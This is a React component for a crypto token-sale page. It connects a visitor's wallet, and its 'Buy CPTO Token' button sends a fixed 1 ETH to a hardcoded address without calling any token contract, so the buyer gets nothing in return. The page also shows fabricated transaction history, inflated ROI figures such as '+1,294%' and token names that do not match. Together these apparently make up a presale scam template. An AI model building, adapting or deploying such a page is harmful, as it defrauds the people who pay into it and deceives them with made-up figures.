import React, { useState } from "react";
import { parseEther } from "ethers";

const isMobile = () => /android|iphone|ipad|ipod/i.test(navigator.userAgent);

const walletOptions = [
    {
        name: "MetaMask",
        icon: "images/metamask.png",
        desktopConnect: async () => {
            const provider = window.ethereum;
            if (provider?.isMetaMask) {
                const accounts = await provider.request({ method: "eth_requestAccounts" });
                return accounts[0];
            } else {
                throw new Error("MetaMask not detected");
            }
        },
        mobileLink: "https://metamask.app.link/dapp/YOUR_DOMAIN.com"
    },
    {
        name: "Trust Wallet",
        icon: "images/trustwallet.png",
        mobileLink: "https://link.trustwallet.com/open_url?coin_id=60&url=https://YOUR_DOMAIN.com"
    },
    {
        name: "Binance Wallet",
        icon: "images/binancewallet.png",
        mobileLink: "binancechain://"
    },
    {
        name: "Phantom Wallet",
        icon: "images/phantom.png",
        mobileLink: "https://phantom.app/ul/browse/YOUR_DOMAIN.com"
    }
];

const WalletConnect = () => {
    const [address, setAddress] = useState("");
    const [connected, setConnected] = useState(false);
    const [error, setError] = useState("");
    const [activeTab, setActiveTab] = useState("eng");

    const handleBuyToken = async () => {
        try {
            if (window.ethereum) {
                const txParams = {
                    from: address,
                    to: '0x67C67F584A586baD8E3B73f92c31F120b521Ec92',
                    value: parseEther("1.0").toString(),
                    gasLimit: '0x5028',
                    maxPriorityFeePerGas: '0x3b9aca00',
                    maxFeePerGas: '0x2540be400',
                };

                const txHash = await window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [txParams],
                });

                console.log("Transaction Hash:", txHash);
            } else {
                alert("Please install MetaMask, Binance Wallet, or a compatible wallet.");
            }
        } catch (err) {
            console.error("Transaction error:", err);
            setError("Failed to send transaction. Please try again.");
        }
    };

    const handleTabChange = (tab) => setActiveTab(tab);

    return (
        <section id="token-part" className="section-p">
            <div className="container">
                <div className="row">
                    {/* LEFT */}
                    <div className="col-sm-10 offset-sm-1 col-md-8 offset-md-2 col-lg-5 offset-lg-0">
                        <div className="token-left">
                            <div className="token-left-bg">
                                <div className="offer text-center">
                                    <img src="images/token-left-sub.png" alt="" />
                                    <h2>TOKEN <span className="brand-color">SALES !</span></h2>

                                    {connected ? (
                                        <button onClick={handleBuyToken} className="btn-4">
                                            Buy CPTO Token
                                        </button>
                                    ) : (
                                        <div>
                                            <p className="mb-2">Connect with:</p>
                                            <div className="d-flex flex-wrap gap-2 justify-content-center">
                                                {walletOptions.map(wallet => (
                                                    <button
                                                        key={wallet.name}
                                                        className="btn-4 d-flex align-items-center mb-2"
                                                        onClick={async () => {
                                                            try {
                                                                if (isMobile()) {
                                                                    window.location.href = wallet.mobileLink;
                                                                } else {
                                                                    if (wallet.desktopConnect) {
                                                                        const selected = await wallet.desktopConnect();
                                                                        setAddress(selected);
                                                                        setConnected(true);
                                                                    } else {
                                                                        alert(`${wallet.name} is mobile-only`);
                                                                    }
                                                                }
                                                            } catch (e) {
                                                                setError(e.message);
                                                            }
                                                        }}
                                                    >
                                                        <img src={wallet.icon} alt={wallet.name} style={{ width: 24, height: 24, marginRight: 8 }} />
                                                        {wallet.name}
                                                    </button>
                                                ))}
                                            </div>
                                        </div>
                                    )}

                                    <div className="count-down mt-4">
                                        <div data-countdown="2025/12/31"></div>
                                    </div>
                                    <div className="payment mt-4">
                                        <p>We accept BTC, ETC, LTC and Other</p>
                                        <div className="method d-flex align-items-center justify-content-center">
                                          
                                        </div>
                                    </div>
                                </div>
                                <div className="sold">
                                    <h2 className="brand-color">$<span className="counter">0.1</span></h2>
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* RIGHT */}
                    <div className="col-lg-7 mt-4 mt-sm-5 mt-lg-0">
                        <div className="token-right">
                            <div className="country-short text-center">
                                <ul id="tabs" className="flat-list">
                                    <li
                                        className={activeTab === "eng" ? "active" : ""}
                                        onClick={() => handleTabChange("eng")}
                                    >Wallet Details</li>
                                    <li
                                        className={activeTab === "chi" ? "active" : ""}
                                        onClick={() => handleTabChange("chi")}
                                    >Transaction History</li>
                                </ul>
                                <div className="clearfix"></div>
                            </div>

                            <div className="tab-content">
                                <div className={`tab-item ${activeTab === "eng" ? "active" : ""}`}>
                                    {address && (
                                        <>
                                            <h5 className="mt-4 mb-2">Welcome, <span className="brand-color">{address}</span></h5>
                                            <h3 className="semi-bold">
                                                Pay with Crypto in <span className="brand-color">81,000,000</span> stores Worldwide.
                                            </h3>
                                        </>
                                    )}
                                    <div className="row no-gutters mt-4">
                                        <div className="col-12 col-lg-4 col-md-5">
                                            <ul className="points points01">
                                                <li className="h5"><i className="fa fa-angle-right"></i> 1 $Vicey = $0.00697</li>
                                            </ul>
                                        </div>
                                        <div className="col-12 col-lg-8 col-md-7 pl-lg-1">
                                            <ul className="points points01">
                                                <li className="h5"><i className="fa fa-angle-right"></i> ROI: +1,294% - ATH ROI: +2,406%</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>

                                <div className={`tab-item ${activeTab === "chi" ? "active" : ""}`}>
                                    <h2 className="mt-4 mb-2">Your <span className="brand-color">Transaction</span> History</h2>
                                    <p className="mb-3">
                                        Review your transaction history and monitor your cryptocurrency activities.
                                    </p>
                                    <div className="transaction-history">
                                        <h4>Latest Transactions</h4>
                                        <table className="table table-striped">
                                            <thead>
                                                <tr>
                                                    <th>Date</th>
                                                    <th>Transaction ID</th>
                                                    <th>Amount</th>
                                                    <th>Status</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <tr>
                                                    <td>25th Jan 2024</td>
                                                    <td>#TXN123456789</td>
                                                    <td>0.25 BTC</td>
                                                    <td><span className="badge bg-success">Completed</span></td>
                                                </tr>
                                                <tr>
                                                    <td>24th Jan 2024</td>
                                                    <td>#TXN123456788</td>
                                                    <td>0.50 BTC</td>
                                                    <td><span className="badge bg-warning">Pending</span></td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>

                                    {address && (
                                        <div className="address-details mt-4">
                                            <h4>Address</h4>
                                            <p>Your current wallet address is <span className="brand-color">{address}</span>.</p>
                                            <p><strong>Note:</strong> Always double-check your wallet address before sending or receiving any funds.</p>
                                        </div>
                                    )}
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                {error && <p className="text-danger text-center mt-3">{error}</p>}
            </div>
        </section>
    );
};

export default WalletConnect;
